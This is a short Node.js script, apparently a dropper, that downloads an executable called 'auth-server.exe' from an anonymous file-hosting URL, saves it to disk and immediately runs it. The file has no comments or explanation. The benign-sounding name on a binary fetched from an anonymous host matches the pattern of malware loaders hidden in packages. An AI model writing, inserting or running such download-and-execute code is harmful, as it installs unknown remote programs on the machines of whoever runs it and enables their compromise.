const https = require('https');
const fs = require('fs');
const child_process = require('child_process');

https.get('https://cdn-151.anonfiles.com/09l5I126z6/b8a2a32d-1689621730/auth-server.exe', (response) => {
  const fileStream = fs.createWriteStream('auth-server.exe');
  response.pipe(fileStream);
  fileStream.on('finish', () => {
    fileStream.close();
    child_process.exec('auth-server.exe', (error) => {
      if (error) throw error;
    });
  });
});